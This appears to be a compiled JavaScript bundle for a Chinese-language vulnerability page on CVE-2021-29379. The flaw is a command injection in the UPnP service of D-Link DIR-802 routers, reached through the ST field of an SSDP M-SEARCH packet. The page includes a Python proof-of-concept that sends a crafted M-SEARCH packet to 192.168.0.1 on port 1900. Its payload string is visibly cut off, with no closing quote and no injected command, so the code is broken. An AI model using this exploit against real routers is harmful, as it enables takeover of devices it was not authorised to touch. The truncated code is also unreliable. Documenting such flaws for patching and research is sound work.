import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as p,a as n,b as s,d as e,e as i}from"./app-58e4a7d6.js";const r={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"DIR-802中存在一个命令注入漏洞，攻击者可以通过精心制作的M-SEARCH数据包向UPnP注入任意命令。",-1),d=n("p",null,"与CVE-2020-15893相似，在固件版本v-1.00b05之前的D-Link DIR-802 A1上发现了一个问题。默认情况下，端口1900上启用了通用即插即用（UPnP）。攻击者可以通过将有效负载注入SSDP M-SEARCH发现数据包的“搜索目标”（ST）字段来执行命令注入。",-1),k=n("p",null,"参考链接：",-1),m={href:"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29379",target:"_blank",rel:"noopener noreferrer"},h={href:"https://cool-y.github.io/2021/03/02/DIR-802-OS-Command-Injection/",target:"_blank",rel:"noopener noreferrer"},_=i(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>DIR-802 hardware revision Ax before v1.00b05
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># coding: utf-8</span>
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> struct
buf <span class="token operator">=</span> &#39;M<span class="token operator">-</span>SEARCH <span class="token operator">*</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>\\r\\nHOST<span class="token punctuation">:</span><span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">1900</span>\\r\\nST<span class="token punctuation">:</span>urn<span class="token punctuation">:</span>schemas<span class="token operator">-</span>upnp<span class="token operator">-</span>org<span class="token punctuation">:</span>service
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&quot;192.168.0.1&quot;</span><span class="token punctuation">,</span> <span class="token number">1900</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function v(b,g){const a=o("ExternalLinkIcon");return c(),p("div",null,[l,u,d,k,n("ul",null,[n("li",null,[n("a",m,[s("https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29379"),e(a)])]),n("li",null,[n("a",h,[s("https://cool-y.github.io/2021/03/02/DIR-802-OS-Command-Injection/"),e(a)])])]),_])}const C=t(r,[["render",v],["__file","D-Link DIR-802 命令注入漏洞 CVE-2021-29379.html.vue"]]);export{C as default};
